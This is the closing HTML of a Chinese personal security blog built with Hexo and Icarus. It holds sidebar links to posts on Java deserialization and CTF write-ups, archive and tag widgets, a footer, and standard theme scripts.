dateTime="2025-09-29T15:42:59.000Z">2025-09-29</time></p><p class="title"><a href="/2025/09/29/Wiz-EKS-Challenge%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/">Wiz EKS Challenge学习记录</a></p><p class="categories"><a href="/categories/web%E7%AC%94%E8%AE%B0/">web笔记</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2024-05-07T03:11:37.000Z">2024-05-07</time></p><p class="title"><a href="/2024/05/07/Jackson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">Jackson反序列化</a></p><p class="categories"><a href="/categories/web%E7%AC%94%E8%AE%B0/">web笔记</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2024-04-09T08:45:56.000Z">2024-04-09</time></p><p class="title"><a href="/2024/04/09/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">Hessian反序列化</a></p><p class="categories"><a href="/categories/web%E7%AC%94%E8%AE%B0/">web笔记</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2024-04-01T14:14:35.000Z">2024-04-01</time></p><p class="title"><a href="/2024/04/01/ROME%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">ROME反序列化</a></p><p class="categories"><a href="/categories/web%E7%AC%94%E8%AE%B0/">web笔记</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2022-10-31T11:13:31.000Z">2022-10-31</time></p><p class="title"><a href="/2022/10/31/%E7%A5%A5%E4%BA%91%E6%9D%AF%E5%88%9D%E8%B5%9B-2022-WP/">祥云杯初赛-2022-WP</a></p><p class="categories"><a href="/categories/CTF-WP/">CTF-WP</a></p></div></article></div></div><div class="card widget" data-type="archives"><div class="card-content"><div class="menu"><h3 class="menu-label">归档</h3><ul class="menu-list"><li><a class="level is-mobile" href="/archives/2025/09/"><span class="level-start"><span class="level-item">九月 2025</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/archives/2024/05/"><span class="level-start"><span class="level-item">五月 2024</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/archives/2024/04/"><span class="level-start"><span class="level-item">四月 2024</span></span><span class="level-end"><span class="level-item tag">2</span></span></a></li><li><a class="level is-mobile" href="/archives/2022/10/"><span class="level-start"><span class="level-item">十月 2022</span></span><span class="level-end"><span class="level-item tag">2</span></span></a></li><li><a class="level is-mobile" href="/archives/2022/09/"><span class="level-start"><span class="level-item">九月 2022</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/archives/2022/07/"><span class="level-start"><span class="level-item">七月 2022</span></span><span class="level-end"><span class="level-item tag">5</span></span></a></li><li><a class="level is-mobile" href="/archives/2022/06/"><span class="level-start"><span class="level-item">六月 2022</span></span><span class="level-end"><span class="level-item tag">2</span></span></a></li><li><a class="level is-mobile" href="/archives/2022/05/"><span class="level-start"><span class="level-item">五月 2022</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/archives/2022/04/"><span class="level-start"><span class="level-item">四月 2022</span></span><span class="level-end"><span class="level-item tag">2</span></span></a></li><li><a class="level is-mobile" href="/archives/2022/03/"><span class="level-start"><span class="level-item">三月 2022</span></span><span class="level-end"><span class="level-item tag">2</span></span></a></li><li><a class="level is-mobile" href="/archives/2021/09/"><span class="level-start"><span class="level-item">九月 2021</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li></ul></div></div></div><div class="card widget" data-type="tags"><div class="card-content"><div class="menu"><h3 class="menu-label">标签</h3><div class="field is-grouped is-grouped-multiline"><div class="control"><a class="tags has-addons" href="/tags/ctf/"><span class="tag">ctf</span><span class="tag">15</span></a></div><div class="control"><a class="tags has-addons" href="/tags/java/"><span class="tag">java</span><span class="tag">3</span></a></div><div class="control"><a class="tags has-addons" href="/tags/%E4%BA%91%E6%94%BB%E9%98%B2/"><span class="tag">云攻防</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/%E5%8D%8F%E8%AE%AE/"><span class="tag">协议</span><span class="tag">1</span></a></div></div></div></div></div><div class="card widget" data-type="links"><div class="card-content"><div class="menu"><h3 class="menu-label">链接</h3><ul class="menu-list"><li><a class="level is-mobile" href="https://abu-blank.top/" target="_blank" rel="noopener"><span class="level-left"><span class="level-item">ABU</span></span><span class="level-right"><span class="level-item tag">abu-blank.top</span></span></a></li><li><a class="level is-mobile" href="https://risehere.net/" target="_blank" rel="noopener"><span class="level-left"><span class="level-item">Rise</span></span><span class="level-right"><span class="level-item tag">risehere.net</span></span></a></li><li><a class="level is-mobile" href="https://www.hsinyan.cn/" target="_blank" rel="noopener"><span class="level-left"><span class="level-item">Hsinyan</span></span><span class="level-right"><span class="level-item tag">www.hsinyan.cn</span></span></a></li></ul></div></div></div></div><!--!--></div></div></section><footer class="footer"><div class="container"><div class="level"><div class="level-start"><a class="footer-logo is-block mb-2" href="/"><img src="/img/avatar.jpg" alt="hututu&#039;blog" height="28"></a><p class="is-size-7"><span>&copy; 2025 hututu</span>  Powered by <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a> &amp; <a href="https://github.com/ppoffice/hexo-theme-icarus" target="_blank" rel="noopener">Icarus</a></p><p class="is-size-7">© 2019</p></div><div class="level-end"><div class="field has-addons"><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Creative Commons" href="https://creativecommons.org/"><i class="fab fa-creative-commons"></i></a></p><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Attribution 4.0 International" href="https://creativecommons.org/licenses/by/4.0/"><i class="fab fa-creative-commons-by"></i></a></p><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Download on GitHub" href="https://github.com/ppoffice/hexo-theme-icarus"><i class="fab fa-github"></i></a></p></div></div></div></div></footer><script src="https://cdnjs.loli.net/ajax/libs/jquery/3.3.1/jquery.min.js"></script><script src="https://cdnjs.loli.net/ajax/libs/moment.js/2.22.2/moment-with-locales.min.js"></script><script src="https://cdnjs.loli.net/ajax/libs/clipboard.js/2.0.4/clipboard.min.js" defer></script><script>moment.locale("zh-cn");</script><script>var IcarusThemeSettings = {
            article: {
                highlight: {
                    clipboard: true,
                    fold: 'unfolded'
                }
            }
        };</script><script data-pjax src="/js/column.js"></script><script src="/js/animation.js"></script><a id="back-to-top" title="回到顶端" href="javascript:;"><i class="fas fa-chevron-up"></i></a><script data-pjax src="/js/back_to_top.js" defer></script><!--!--><!--!--><!--!--><script src="https://cdnjs.loli.net/ajax/libs/cookieconsent/3.1.1/cookieconsent.min.js" defer></script><script>window.addEventListener("load", () => {
      window.cookieconsent.initialise({
        type: "info",
        theme: "edgeless",
        static: false,
        position: "bottom-left",
        content: {
          message: "此网站使用Cookie来改善您的体验。",
          dismiss: "知道了！",
          allow: "允许使用Cookie",
          deny: "拒绝",
          link: "了解更多",
          policy: "Cookie政策",
          href: "https://www.cookiesandyou.com/",
        },
        palette: {
          popup: {
            background: "#edeff5",
            text: "#838391"
          },
          button: {
            background: "#4b81e8"
          },
        },
      });
    });</script><script src="https://cdnjs.loli.net/ajax/libs/lightgallery/1.10.0/js/lightgallery.min.js" defer></script><script src="https://cdnjs.loli.net/ajax/libs/justifiedGallery/3.8.1/js/jquery.justifiedGallery.min.js" defer></script><script>window.addEventListener("load", () => {
            if (typeof $.fn.lightGallery === 'function') {
                $('.article').lightGallery({ selector: '.gallery-item' });
            }
            if (typeof $.fn.justifiedGallery === 'function') {
                if ($('.justified-gallery > p > .gallery-item').length) {
                    $('.justified-gallery > p > .gallery-item').unwrap();
                }
                $('.justified-gallery').justifiedGallery();
            }
        });</script><!--!--><!--!--><script src="https://cdnjs.loli.net/ajax/libs/pjax/0.2.8/pjax.min.js"></script><script src="/js/pjax.js"></script><!--!--><!--!--><!--!--><script data-pjax src="/js/main.js" defer></script><div class="searchbox"><div class="searchbox-container"><div class="searchbox-header"><div class="searchbox-input-container"><input class="searchbox-input" type="text" placeholder="想要查找什么..."></div><a class="searchbox-close" href="javascript:;">×</a></div><div class="searchbox-body"></div></div></div><script data-pjax src="/js/insight.js" defer></script><script data-pjax>document.addEventListener('DOMContentLoaded', function () {
            loadInsight({"contentUrl":"/content.json"}, {"hint":"想要查找什么...","untitled":"(无标题)","posts":"文章","pages":"页面","categories":"分类","tags":"标签"});
        });</script></body></html>